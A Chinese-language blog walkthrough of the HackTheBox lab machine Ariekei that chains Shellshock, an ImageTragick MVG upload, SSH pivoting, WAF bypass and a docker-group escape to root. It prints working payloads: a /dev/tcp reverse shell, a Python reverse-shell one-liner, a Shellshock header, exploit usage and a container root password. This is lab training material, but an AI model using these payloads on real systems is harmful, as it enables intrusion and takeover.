> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sVT7k_4Rf0jUqGi9D1Vi2Q)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **120** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/4MrQO6osIsVQf89k6cRQVkucDSPXwiaT2lKFBmAe70jsicOPXxtPRxL7cJALRNYtmVCO7cDLibmNbwcQoa6v81iasg/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/115

靶机难度：高级（5.0/10）

靶机发布日期：2018 年 3 月 8 日

靶机描述：

Ariekei is a complex machine focusing mainly on web application firewalls and pivoting techniques. This machine is by far one of the most challenging, requiring multiple escalations and container breakouts.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/KEY1ajicY5OUiaJYibLLdbVsQkiaTQHdtvSQY5G0a5eNiawwMxUpl7wor6gNw2Vne7qqKm1eBnukvFotHvMstib7tCAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/1prMbIpCa3humOrLAChJmsjMl4Kxia7vzrQE59ny2bGibWz5Cr8YzNvia9NXzt8O2jiclnVwHYxubpFU1Q6dX9FRCQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/5PYA1G5YGGkjAN1M3sw2tjaT2EzjYhfiax6biaK6IUQxeAFY5cgZQtGqXrMp1oRbNic8EDqpxsg5BjArxBhibLM5XQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUfxZghbGSe8h1Y1lWpRF2sY2mM0L38xXTg09oxas8r2LZkuiaan8ERbQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.65....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUoTaAxLks76mGvwDmrduRR2bm11H5XIWbN7IuojoaqjqZAbMlCYxZvw/640?wx_fmt=png)

Nmap 发现了一个 nginx 服务器和两个运行不同版本的 OpenSSH 服务器，这表明系统上可能正在运行某种容器或虚拟环境.... 可能是服务于不同的网站...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUpBg0E1mickwjxW0ZgbaItSXyrVnr08z57eSDAWfwwZJUUC53MdY9iajg/640?wx_fmt=png)

正常页面访问提示正在维护...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUGIongCu9ZCD2skHLhU6fuGnDYrP0HFqHJUPF1126hs16mHKf895PibQ/640?wx_fmt=png)

在凭证发现了两个 DNS 域名.... 添加到 hosts...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUd3ciaAoUp11vYB1ckx61tgK45749ibzmUVprMpvrHQ8OvGaz5GsZMc7w/640?wx_fmt=png)

利用 dirbuster 爆破目录刚开始就报出了 / cgi-bin/stats 存在 shellshock 漏洞利用....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUK3x3ianWps9wW8fTMTr8GFf1sjJsicNXlc04yNNyZNq0Q6qmWFSqicCOA/640?wx_fmt=png)

先访问该目录，这是一个 shell 脚本.... 提供了很多有用信息...

docroot 设置用户的主目录：DOCUMENT_ROOT=/home/spanishdancer/content

后端服务器版本为：SERVER_SOFTWARE=Apache/2.2.22 (Debian) 与我们在标头中实际获得的版本不同，应该使用了某种类型的反向代理或 WAF 等情况...

服务器的内部 IP 地址为：172.24.0.2....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUa5fBsR68YX3XsDunrfTjPGqIUurIc3IsWY6V0IY2oDiazz9uAibcxlUQ/640?wx_fmt=png)

```
curl -k -H "User-Agent: () { :; }; /bin/eject" https://10.10.10.65/cgi-bin/stats
```

通过提示，直接利用 shellshock 漏洞攻击，发现一个表情符号，该表情符号将在我们尝试利用它时持续存在，应该是有一个 Web 应用程序防火墙在保护服务器免受攻击....（WAF)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUHUVJx1sRbxEvPeALfE5NkapFiaU9xLPtcKrCp2ibuSR6HIUYGdibiat3fA/640?wx_fmt=png)

访问两个域名，一个是 Not Found 报错，一个重定向回到了原始 web 页面...

挂着利用 dirb 和 gobuster 爆破目录发现都存在 upload 目录信息... 下载 upload 一般文件上传利用了...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU0e2q1hAOFibJjEdhPN4eyklx5FAdXibbNx2FkafeEAalPwaiaa58FoC3g/640?wx_fmt=png)

标题表明这是图像转换器，随意上传文件后没任何反应...

这里经过 google 查询，图像转换器可能容易受到 [Imagetragick](https://imagetragick.com/) 的攻击，Imagetragick 是 ImageMagick 库中较著名的利用方法之一...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU90XnFWOyl5n6mqkH7yq3QGiaKRiazk0uauBBvZJ2icQpKibTuqOKJHwjSQ/640?wx_fmt=png)

可看到随意搜索 Imagetragick 攻击都能找到 shell 代码.... 利用即可

创建了 mvg 文件来利用此漏洞....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUU2gGZQucUASIHia87ImeWn4CWjiaWdgEXEXDSIUuEftibEAzO6c5rUriaw/640?wx_fmt=png)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i >/dev/tcp/10.10.14.51/4444 0<&1 2>&1")'ms
pop graphic-context
```

通过简单一句话 shell 提权成功提权...root 权限？？？

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUFKIFyR4DH2LY9CHv2v4aV6pDc9h1yVu1ZzDaicvoFXB1TOBzP6Qicacg/640?wx_fmt=png)

这里限制非常多，无法读取 flag 信息，先枚举吧.... 上传 LinEnum

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUtYynmdsYMRJjl38SuwAL5eXl031yoOnLldqJflIxQecmRYuRkaib0Sw/640?wx_fmt=png)

这里发现提权的这台是在 Docker 容器中，根据 nmap 扫描，应该是存在多台服务器情况...

下载的权限就在一个监狱当中，需要越狱突出重围的感觉... 限制非常多，有 WAF 或者堡垒机等安全设备....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUiayqeRndlda33QXvqZTgkw2W60AKMBibVaNaIqbMt2LbeZ9K2vmJYibNg/640?wx_fmt=png)

存在 docker 容器，mount -l 查看挂载的文件，找到一个名为 / common 的目录....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU3WuBh4ibOdVLqiaUuLLyjvtp1ZoQNS9MTqLK1V1rYdEXOHiajDYaYUjVQ/640?wx_fmt=png)

在 commin 目录下存在很多子目录... 里面存在很多很多提权开拓思路的信息....

这里发现了映射的信息... 知道了服务器设备 IP 之间的映射关系

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUicjjKEED7U39ScdbWjiaOIJHlgxWicUcU4H6GM0Y15lvZf2AOPniaJGaUg/640?wx_fmt=png)

查看 arp 后，发现 172.23.0.252，应该是 WAF 设备 IP....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUiak08aoaFnBvxLicHdednq0ria3vqXEKJAnfcwA0iczKmnEcyd3BHreKcQ/640?wx_fmt=png)

可以看到为容器设置了硬编码的 root 密码...

Container 具有两个网络和两个 IP 172.24.0.253 和 172.23.0.253，表明它是双宿主的...

主机上端口 1022 公开的 SSH 服务....NMAP 也发现了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU0MwSN2lNjaC3olicYL1sobQoNhCW5S77Sw3REraoiakCAZAUibibP4icKHA/640?wx_fmt=png)

继续找到. secrets 的隐藏目录... 找到名为 bastion_key 和 bastion_key.pub 文件...rsa 密匙...ssh 利用即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUz90R0OY51NhocbnkVd2eiblQicObibEgW3aSTNqkpicfxwB29HhNtUc1cg/640?wx_fmt=png)

直接利用 ssh 成功登陆... 这里检查还是在 docker 容器中....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUXTXPYDzPTsMPmMfvVFINX3j3741vn6YiaGK0qiax5Hys3yBdcNoNJOkg/640?wx_fmt=png)

可以看到 docker 系统的 IP 地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU7bkicy0kOc1HsKbia3Rib0rj6LrY0BQYTtqkl6vXibbNCP6I4uWdJYjFrQ/640?wx_fmt=png)

前面文件上传提权查看到 `start.sh` 就知道了其中一些容器在实时网络和测试网络上都是双宿主的，目前所在的容器 convert-live 位于实时网络中，但 bastion-live 我们刚刚通过 SSH 登录的容器位于两者中...

这种网络布局的有趣之处在于，这 waf-live 是在端口 443 上向我们公开的设备，而它所做的就是在我们与 blog-test 容器之间路由流量，攻击 stats 脚本时看到的那些图像是通过生成 waf-live 枚举中的容器文件时看到的图像 / common....

这是 nginx.confin 中的摘录 waf-live，说明 ModSecurity 在充当 WAF...`ModSecurityEnabled on;ModSecurityConfig modsecurity.conf;`

*

前面就知道在进行目录爆破扫描期间，找到了 / cgi-bin/stats / 目录容易受到 shellshock 的攻击，但是由于 Web 应用程序防火墙的原因无法利用它，由于 waf-live 在端口 443 和我们之间进行流量路由并在端口 443 上进行着，因此可以从服务器内部利用 Shellshock 漏洞....

![](https://mmbiz.qpic.cn/mmbiz_png/1prMbIpCa3humOrLAChJmsjMl4Kxia7vzrQE59ny2bGibWz5Cr8YzNvia9NXzt8O2jiclnVwHYxubpFU1Q6dX9FRCQ/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/5PYA1G5YGGkjAN1M3sw2tjaT2EzjYhfiax6biaK6IUQxeAFY5cgZQtGqXrMp1oRbNic8EDqpxsg5BjArxBhibLM5XQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/vekKnDibcricu2UWZUgqzbqic9EBkejl6uTaAp9pZqTSiaibKPpbJamzHXyE2iapH87vjcQHV7hz25QFcBibaMpyadLqg/640?wx_fmt=png)

方法 1：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yo5kHOX9ibN8ibibPy7W2Hr5gIiaWyWEuIGKPDgfhHf0oA2dpjKy7LLyBHicoTtfRED9OyIK92hpd9GhGqx3iaLln2A/640?wx_fmt=png)

利用 EXP 直接绕过 WAF 提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU4ojoY5UCOdHRMezu7iaQtsevugUTMibIXLGjGI4zJm2QIdpPwu6zvB9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUH7G1wdjibjeypQmWZbtAznmJwRYN38brxkH4YpdN5vQPiasHia8EvPrQA/640?wx_fmt=png)

测试发现是存在可内部利用 Shellshock 漏洞...

为了避免受到保护，直接从此容器发起攻击即可，该容器可以通过另一个子网完全绕过 waf...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUiaYNMwW8kACCDUlAK9TPR0cThj3ztRoVrKRCriang3tyhxIoSibogEYNg/640?wx_fmt=png)

```
python 34900.py  payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats
```

利用 Shellshock 漏洞可执行的 34900_EXP 进行提权... 成功绕过进入了... 获得了 www-data 权限... 但这不是一个稳定的外壳...

目前信息收集中拥有 Dockerfile 中的密码 root:Ib3!kTEvYw6*P7s，因此我们所要做的就是生成一个 tty，直接就可以使用 su 进行 root 升级....

这里可以利用 MSF 的 web_delivery 生成 tty，获得别的方式... 自行尝试....

后续提权方法在方法 2 中演示...

![](https://mmbiz.qpic.cn/mmbiz_png/vekKnDibcricu2UWZUgqzbqic9EBkejl6uTaAp9pZqTSiaibKPpbJamzHXyE2iapH87vjcQHV7hz25QFcBibaMpyadLqg/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yo5kHOX9ibN8ibibPy7W2Hr5gIiaWyWEuIGKPDgfhHf0oA2dpjKy7LLyBHicoTtfRED9OyIK92hpd9GhGqx3iaLln2A/640?wx_fmt=png)

远程端口转发提权....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoU2eHicibq6acnkAibrsWefLJ34bHicpkAqBkQ7ibtCP2rJCaXgL7Qibj7LtLg/640?wx_fmt=png)

利用 - L 和 - R 进行端口转发....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUXBDFNjFiakz4bO0aUCgtNTR8QtMeiaQIjv1nBQGJU6kdBJPXFEpN5NxQ/640?wx_fmt=png)

可看到本地存在 22 端口...

这里只需利用 ssh 将 8888 在 kali 上启动，当从 kali 链接 8888 端口时，该链接就会转向堡垒机的 22 端口...

可看到成功端口转发 8888 端口到 22...

然后进行 `ssh -p 8888 -i id_rsa 127.0.0.1` 成功本地登陆...

我们知道存在真实 flag 的服务器 IP 是 172.24.0.2:80 上... 继续建桥

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUeicX5sDfk19hjTrR3hmA9zVfLiaOiaZosOzO7yQrj8WjYia6z9hSWCIMOQ/640?wx_fmt=png)

继续将 9999 端口转发到 80，可看到本地已监听...

前面通过本地 8888 转发到堡垒 22，现在将本地 9999 转发到真实服务 80 上.... 测试下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUI3lXNeGzDYWxm9Hs473rs2fKOC4QwBcH7VTHa6IQ4pXOu2bpYiaENxg/640?wx_fmt=png)

转发到了 https://10.10.10.65/cgi-bin/stats....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUO5p6D1DeTicPPqvWEj5cgjtmsZT1C29seaftAovWgymuyWwibFnNEXFw/640?wx_fmt=png)

这里前面就知道不稳定外壳，我直接利用 BP 拦截注入了....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUxibDqxwbL1BCY1XibtbWhSCJ8gLEc1GQ1iaZbniaQ0OpMTw7icF43ucWCkw/640?wx_fmt=png)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

利用稳定外壳....shell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUqD7ZThaGgGvyzcUtsErYhZquJFExG8ia1SM9c5ibla8sA3aRTfPwXLgw/640?wx_fmt=png)

可以看到，我是将端口都转发到 kali 本地，利用 Shellshock 漏洞进行提权... 但是提权需要在堡垒上进行 NC 监听获得外壳...

这里会出现非常多的不方便，需要继续转发到本地 kali 上做外壳....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUUEjjic9nRUm3WPiaH2DorS8kceGLXchaYHTKg1soiaQ16AR5XUanwauuQ/640?wx_fmt=png)

直接转发即可... 转发到了 6666 端口上...

当本地执行提权后，所有的流量都走端口转发到了我本地的机子上...

成功在本地获得反向外壳 www 低权用户....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUtxWwlhEHLDYnHn8DZ1F7dMxBia7N7Rf4noUkHqxiaxVRiavfG4iaoF1XHA/640?wx_fmt=png)

通过前面信息收集在 Dockerfile 获取的 root 密匙，用 python 启动 pty shell，然后 su 到 root.... 获得了 user_flag 信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUljSWGIHNWN8vuoWvtnz6rC5qsbE0D3eibVZHhHgvPQvu6PP5JBHYpSg/640?wx_fmt=png)

继续搜索隐藏目录，在本目录下找到. ssh 的目录，找到三个文件 authorized_keys，id_rsa 和 id_rsa.pub... 存在 RSA 密钥...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUoXaiazNdTKMOIaCiacxiaTIrjoOaaia3gR2xpvdfqKMPpyOibo9SibqiavLlg/640?wx_fmt=png)

保存到本地，进行破解... 获得了密码...（跳过了简单操作，讲很多次了）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUjiaX61vNM3ZF8rwPaGmTkbq233rB6ibdpehMh9SM98ia1T9u0IZaFJLyA/640?wx_fmt=png)

有密匙凭证 + 密码，直接 ssh 登陆... 直接获得了 spanishdancer 用户权限外壳...

这里就直接进入用户了，不会通过 waf 和堡垒机的限制了....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUsySXMWTBibpXbtYp7jw1fpW0OOzn2EQE7NZbMX6WLZyuwRVyHEeELxw/640?wx_fmt=png)

这里靶机用户是 docker 容器状态，又在 upload 时知道 Upload Image 图像转换器...

直接检查了 Docker 映像.... 发现 bash 映像可利用....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUP55IPfs5TN9kPlahC8Vufpswhd9hRT7f0Lydnee5VoETibGESq5llRw/640?wx_fmt=png)

```
https://fosterelli.co/privilege-escalation-via-docker.html
```

这有一篇文章介绍了 docker images 内核提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM3SvGhYrDiasx6U9WnaiaxoUxicNQv1DF8TElEHUFI7j9GLBBU1ddAWIE5EcicmoAtTt5iaX2W7jDfKSw/640?wx_fmt=png)

```
docker run -it -v /:/opt bash bash
```

直接 bash 提权即可... 获得了 root 权限... 获得了 root_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/AhUATAqa6tibYa4zTrlvc4l1rFIH7HV8c7ibcicw1jgibbwVW2zia9JeVCleEKLjkT0RO7sJS34DVSzMJ9sGsIAn5Fg/640?wx_fmt=png)

信息收集 + dir 目录爆破 + shellshock 漏洞利用 + 文件上传提权 + 信息枚举分析 + rsa 密匙爆破提权 + 端口转发利用或 EXP 利用绕过堡垒机和防火墙 + docker images 内核提权....

这台靶机学到了很多很多思路想法，这台靶机主要思路非常广泛，需要搭桥需要跨越不然拿不到 flag...

方法除了 EXP 和 docker images 内核提权方法没用过，其余都是非常熟悉的方法，学习新思路，加油！！！

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台高级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/oQI1m5hhwD5Gicl7xUf6kh3ISTH6iacM05s8G12QVAykGzh7S5Po8EgeS5XJvZbiacbS8AuRQJ1VaRic18jlToOhVQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)